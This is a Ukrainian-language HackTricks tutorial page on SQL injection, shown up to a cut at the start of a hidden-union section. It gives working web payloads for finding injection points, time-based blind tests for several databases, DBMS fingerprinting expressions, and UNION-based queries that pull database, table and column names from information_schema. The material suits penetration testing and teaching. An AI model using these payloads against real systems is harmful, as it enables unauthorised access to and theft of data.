# SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) —î –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–æ—é –ø–æ–¥—ñ—î—é –≤ —Å—Ñ–µ—Ä—ñ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ **–Ü—Å–ø–∞–Ω—ñ—ó** —Ç–∞ –æ–¥–Ω—ñ—î—é –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –≤ **–Ñ–≤—Ä–æ–ø—ñ**. –ó **–º–µ—Ç–æ—é –ø—Ä–æ—Å—É–≤–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –∑–Ω–∞–Ω—å**, —Ü–µ–π –∫–æ–Ω–≥—Ä–µ—Å —î –≥–∞—Ä—è—á–æ—é —Ç–æ—á–∫–æ—é –∑—É—Å—Ç—Ä—ñ—á—ñ –¥–ª—è –ø—Ä–æ—Ñ–µ—Å—ñ–æ–Ω–∞–ª—ñ–≤ —É —Å—Ñ–µ—Ä—ñ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π —Ç–∞ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ —É—Å—ñ—Ö –¥–∏—Å—Ü–∏–ø–ª—ñ–Ω–∞—Ö.

{% embed url="https://www.rootedcon.com/" %}

## –©–æ —Ç–∞–∫–µ SQL-—ñ–Ω'—î–∫—Ü—ñ—è?

**SQL-—ñ–Ω'—î–∫—Ü—ñ—è** ‚Äî —Ü–µ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –±–µ–∑–ø–µ–∫–∏, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º **–≤—Ç—Ä—É—á–∞—Ç–∏—Å—è –≤ –∑–∞–ø–∏—Ç–∏ –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö** –ø—Ä–æ–≥—Ä–∞–º–∏. –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º **–ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏**, **–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏** –∞–±–æ **–≤–∏–¥–∞–ª—è—Ç–∏** –¥–∞–Ω—ñ, –¥–æ —è–∫–∏—Ö —ó–º –Ω–µ —Å–ª—ñ–¥ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø, –≤–∫–ª—é—á–∞—é—á–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∞–±–æ –±—É–¥—å-—è–∫—ñ –¥–∞–Ω—ñ, –¥–æ —è–∫–∏—Ö –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –ø—Ä–æ–≥—Ä–∞–º–∞. –¢–∞–∫—ñ –¥—ñ—ó –º–æ–∂—É—Ç—å –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –ø–æ—Å—Ç—ñ–π–Ω–∏—Ö –∑–º—ñ–Ω —É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ –∞–±–æ –∑–º—ñ—Å—Ç—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –∞–±–æ –Ω–∞–≤—ñ—Ç—å –¥–æ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó —Å–µ—Ä–≤–µ—Ä–∞ –∞–±–æ –≤—ñ–¥–º–æ–≤–∏ –≤ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ.

## –í–∏—è–≤–ª–µ–Ω–Ω—è —Ç–æ—á–∫–∏ –≤—Ö–æ–¥—É

–ö–æ–ª–∏ —Å–∞–π—Ç –≤–∏–≥–ª—è–¥–∞—î **–≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ SQL-—ñ–Ω'—î–∫—Ü—ñ—ó (SQLi)** —á–µ—Ä–µ–∑ –Ω–µ–∑–≤–∏—á–∞–π–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ –∑–∞–ø–∏—Ç–∏, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ SQLi, **–ø–µ—Ä—à–∏–º –∫—Ä–æ–∫–æ–º** —î —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ **–≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –≤ –∑–∞–ø–∏—Ç, –Ω–µ –ø–æ—Ä—É—à—É—é—á–∏ –π–æ–≥–æ**. –¶–µ –≤–∏–º–∞–≥–∞—î –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –º–µ—Ç–æ–¥—É **–µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ –≤–∏—Ö–æ–¥—É –∑ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É**. 
–¶–µ –∫—ñ–ª—å–∫–∞ –∫–æ—Ä–∏—Å–Ω–∏—Ö –ø—Ä–∏–∫–ª–∞–¥—ñ–≤:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
–¢–æ–¥—ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏, —è–∫ **–≤–∏–ø—Ä–∞–≤–∏—Ç–∏ –∑–∞–ø–∏—Ç, —â–æ–± –Ω–µ –±—É–ª–æ –ø–æ–º–∏–ª–æ–∫**. –©–æ–± –≤–∏–ø—Ä–∞–≤–∏—Ç–∏ –∑–∞–ø–∏—Ç, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–≤–µ—Å—Ç–∏** –¥–∞–Ω—ñ, —â–æ–± **–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∑–∞–ø–∏—Ç –ø—Ä–∏–π–Ω—è–≤ –Ω–æ–≤—ñ –¥–∞–Ω—ñ**, –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ **–≤–≤–µ—Å—Ç–∏** —Å–≤–æ—ó –¥–∞–Ω—ñ —Ç–∞ **–¥–æ–¥–∞—Ç–∏ —Å–∏–º–≤–æ–ª –∫–æ–º–µ–Ω—Ç–∞—Ä—è –≤ –∫—ñ–Ω—Ü—ñ**.

_–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏ –∞–±–æ –ø–æ–º—ñ—Ç–∏—Ç–∏ –≤—ñ–¥–º—ñ–Ω–Ω–æ—Å—Ç—ñ, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç –ø—Ä–∞—Ü—é—î, –∞ –∫–æ–ª–∏ –Ω—ñ, —Ü–µ–π –µ—Ç–∞–ø –±—É–¥–µ –ª–µ–≥—à–∏–º._

### **–ö–æ–º–µ–Ω—Ç–∞—Ä—ñ**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ª–æ–≥—ñ—á–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π

–ù–∞–¥—ñ–π–Ω–∏–π –º–µ—Ç–æ–¥ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –¥–æ SQL-—ñ–Ω'—î–∫—Ü—ñ–π –ø–æ–ª—è–≥–∞—î –≤ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ **–ª–æ–≥—ñ—á–Ω–æ—ó –æ–ø–µ—Ä–∞—Ü—ñ—ó** —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–Ω—ñ –∑–∞ –æ—á—ñ–∫—É–≤–∞–Ω–∏–º–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, GET-–ø–∞—Ä–∞–º–µ—Ç—Ä, —Ç–∞–∫–∏–π —è–∫ `?username=Peter`, —â–æ –¥–∞—î —ñ–¥–µ–Ω—Ç–∏—á–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç –ø—Ä–∏ –∑–º—ñ–Ω—ñ –Ω–∞ `?username=Peter' or '1'='1`, –≤–∫–∞–∑—É—î –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ SQL-—ñ–Ω'—î–∫—Ü—ñ–π.

–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è **–º–∞—Ç–µ–º–∞—Ç–∏—á–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π** —Å–ª—É–≥—É—î –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—é —Ç–µ—Ö–Ω—ñ–∫–æ—é –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –¥–æ—Å—Ç—É–ø –¥–æ `?id=1` —Ç–∞ `?id=2-1` –¥–∞—î —Ç–æ–π —Å–∞–º–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç, —Ü–µ –≤–∫–∞–∑—É—î –Ω–∞ SQL-—ñ–Ω'—î–∫—Ü—ñ—é.

–ü—Ä–∏–∫–ª–∞–¥–∏, —â–æ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—Ç—å –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –ª–æ–≥—ñ—á–Ω–æ—ó –æ–ø–µ—Ä–∞—Ü—ñ—ó:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
–¶–µ–π —Å–ø–∏—Å–æ–∫ —Å–ª—ñ–≤ –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ SQL-—ñ–Ω'—î–∫—Ü—ñ—ó** –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### –ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —á–∞—Å—É

–í –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –≤–∏ **–Ω–µ –ø–æ–º—ñ—Ç–∏—Ç–µ –∂–æ–¥–Ω–∏—Ö –∑–º—ñ–Ω** –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, —è–∫—É –≤–∏ —Ç–µ—Å—Ç—É—î—Ç–µ. –¢–æ–º—É —Ö–æ—Ä–æ—à–∏–π —Å–ø–æ—Å—ñ–± **–≤–∏—è–≤–∏—Ç–∏ —Å–ª—ñ–ø—ñ SQL-—ñ–Ω'—î–∫—Ü—ñ—ó** - —Ü–µ –∑–º—É—Å–∏—Ç–∏ –ë–î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥—ñ—ó, —è–∫—ñ –º–∞—Ç–∏–º—É—Ç—å **–≤–ø–ª–∏–≤ –Ω–∞ —á–∞—Å**, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏.\
–û—Ç–∂–µ, –º–∏ –±—É–¥–µ–º–æ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É–≤–∞—Ç–∏ –≤ SQL-–∑–∞–ø–∏—Ç—ñ –æ–ø–µ—Ä–∞—Ü—ñ—é, —è–∫–∞ –∑–∞–π–º–µ –±–∞–≥–∞—Ç–æ —á–∞—Å—É –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
–í –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö **—Ñ—É–Ω–∫—Ü—ñ—ó –∑–∞—Ç—Ä–∏–º–∫–∏ –Ω–µ –±—É–¥—É—Ç—å –¥–æ–∑–≤–æ–ª–µ–Ω—ñ**. –¢–æ–¥—ñ, –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ –∑–∞–ø–∏—Ç **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Å–∫–ª–∞–¥–Ω—ñ –æ–ø–µ—Ä–∞—Ü—ñ—ó**, —è–∫—ñ –∑–∞–π–º–∞—Ç–∏–º—É—Ç—å –∫—ñ–ª—å–∫–∞ —Å–µ–∫—É–Ω–¥. _–ü—Ä–∏–∫–ª–∞–¥–∏ —Ü–∏—Ö —Ç–µ—Ö–Ω—ñ–∫ –±—É–¥—É—Ç—å –ø—Ä–æ–∫–æ–º–µ–Ω—Ç–æ–≤–∞–Ω—ñ –æ–∫—Ä–µ–º–æ –¥–ª—è –∫–æ–∂–Ω–æ—ó —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó (—è–∫—â–æ —Ç–∞–∫—ñ —î)_.

### –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –±–µ–∫–µ–Ω–¥—É

–ù–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –±–µ–∫–µ–Ω–¥ - —Ü–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó —Ä—ñ–∑–Ω–∏—Ö –±–µ–∫–µ–Ω–¥—ñ–≤. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ _**sleep**_ **—Ñ—É–Ω–∫—Ü—ñ—ó** –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ —Ä–æ–∑–¥—ñ–ª—É –∞–±–æ —Ü—ñ (—Ç–∞–±–ª–∏—Ü—è –∑ [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
–¢–∞–∫–æ–∂, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ –≤–∏—Ö–æ–¥—É –∑–∞–ø–∏—Ç—É, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–≤–µ—Å—Ç–∏ –≤–µ—Ä—Å—ñ—é –±–∞–∑–∏ –¥–∞–Ω–∏—Ö**.

{% hint style="info" %}
–£ –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—ñ –º–∏ –æ–±–≥–æ–≤–æ—Ä–∏–º–æ —Ä—ñ–∑–Ω—ñ –º–µ—Ç–æ–¥–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ä—ñ–∑–Ω–∏—Ö –≤–∏–¥—ñ–≤ SQL Injection. –ú–∏ –±—É–¥–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ MySQL —è–∫ –ø—Ä–∏–∫–ª–∞–¥.
{% endhint %}

### –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∑ PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ Union

### –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Å—Ç–æ–≤–ø—Ü—ñ–≤

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –≤–∏—Ö—ñ–¥ –∑–∞–ø–∏—Ç—É, —Ü–µ –Ω–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± –π–æ–≥–æ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.\
–ü–æ-–ø–µ—Ä—à–µ, –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è **–∫—ñ–ª—å–∫—ñ—Å—Ç—å** **—Å—Ç–æ–≤–ø—Ü—ñ–≤**, —è–∫—ñ **–ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç** –ø–æ–≤–µ—Ä—Ç–∞—î. –¶–µ —Ç–æ–º—É, —â–æ **–æ–±–∏–¥–≤–∞ –∑–∞–ø–∏—Ç–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–æ–≤–µ—Ä—Ç–∞—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å—Ç–æ–≤–ø—Ü—ñ–≤**.\
–î–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–≤–∞ –º–µ—Ç–æ–¥–∏:

#### Order/Group by

–©–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å—Ç–æ–≤–ø—Ü—ñ–≤ —É –∑–∞–ø–∏—Ç—ñ, –ø–æ—Å—Ç—É–ø–æ–≤–æ –∫–æ—Ä–∏–≥—É–π—Ç–µ —á–∏—Å–ª–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–µ –≤ **ORDER BY** –∞–±–æ **GROUP BY** –∫–ª–∞—É–∑–∞—Ö, –ø–æ–∫–∏ –Ω–µ –±—É–¥–µ –æ—Ç—Ä–∏–º–∞–Ω–æ —Ö–∏–±–Ω—É –≤—ñ–¥–ø–æ–≤—ñ–¥—å. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ä—ñ–∑–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ **GROUP BY** —Ç–∞ **ORDER BY** –≤ SQL, –æ–±–∏–¥–≤–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –æ–¥–Ω–∞–∫–æ–≤–æ –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Å—Ç–æ–≤–ø—Ü—ñ–≤ –∑–∞–ø–∏—Ç—É.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

–í–∏–±–µ—Ä—ñ—Ç—å –≤—Å–µ –±—ñ–ª—å—à–µ —ñ –±—ñ–ª—å—à–µ –∑–Ω–∞—á–µ–Ω—å null, –ø–æ–∫–∏ –∑–∞–ø–∏—Ç –Ω–µ –±—É–¥–µ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_–í–∏ –ø–æ–≤–∏–Ω–Ω—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `null` –∑–Ω–∞—á–µ–Ω–Ω—è, –æ—Å–∫—ñ–ª—å–∫–∏ –≤ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö —Ç–∏–ø–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤ –∑ –æ–±–æ—Ö —Å—Ç–æ—Ä—ñ–Ω –∑–∞–ø–∏—Ç—É –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–º–∏, —ñ null —î –¥—ñ–π—Å–Ω–∏–º —É –∫–æ–∂–Ω–æ–º—É –≤–∏–ø–∞–¥–∫—É._

### –í–∏—Ç—è–≥—Ç–∏ –Ω–∞–∑–≤–∏ –±–∞–∑ –¥–∞–Ω–∏—Ö, –Ω–∞–∑–≤–∏ —Ç–∞–±–ª–∏—Ü—å —Ç–∞ –Ω–∞–∑–≤–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤

–£ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –ø—Ä–∏–∫–ª–∞–¥–∞—Ö –º–∏ –±—É–¥–µ–º–æ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –Ω–∞–∑–≤—É –≤—Å—ñ—Ö –±–∞–∑ –¥–∞–Ω–∏—Ö, –Ω–∞–∑–≤—É —Ç–∞–±–ª–∏—Ü—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, –Ω–∞–∑–≤–∏ —Å—Ç–æ–≤–ø—Ü—ñ–≤ —Ç–∞–±–ª–∏—Ü—ñ:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_–Ü—Å–Ω—É—î —Ä—ñ–∑–Ω–∏–π —Å–ø–æ—Å—ñ–± –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ü–∏—Ö –¥–∞–Ω–∏—Ö —É –∫–æ–∂–Ω—ñ–π —Ä—ñ–∑–Ω—ñ–π –±–∞–∑—ñ –¥–∞–Ω–∏—Ö, –∞–ª–µ –º–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—è –∑–∞–≤–∂–¥–∏ –æ–¥–Ω–∞–∫–æ–≤–∞._

## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ–≥–æ –æ–±'—î–¥–Ω–∞–Ω–Ω—è

–ö–æ–ª–∏ –≤–∏—Ö—ñ–¥ –∑–∞–ø–∏—Ç—É –≤–∏–¥–∏–º–∏–π, –∞–ª–µ –æ–±'—î–¥–Ω–∞–Ω–∏–π —ñ–Ω'—î–∫—Ü—ñ—é –∑–¥–∞—î—Ç—å—Å—è –Ω–µ–º–æ–∂–ª–∏–≤–∏–º, —Ü–µ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å **–ø—Ä–∏—Ö–æ–≤–∞–Ω–æ—ó –æ–±'—î–¥–Ω–∞–Ω–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó**. –¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π —á–∞—Å—Ç–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Å–∏—Ç—É–∞—Ü—ñ—ó —Å–ª—ñ–ø–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó. –©–æ–± –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ —Å–ª—ñ–ø—É —ñ–Ω'—î–∫—Ü—ñ—é –Ω–∞ –æ–±'—î–¥–Ω–∞–Ω—É, –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –∑–∞–ø–∏—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–∞ –±–µ–∫–µ–Ω–¥—ñ.

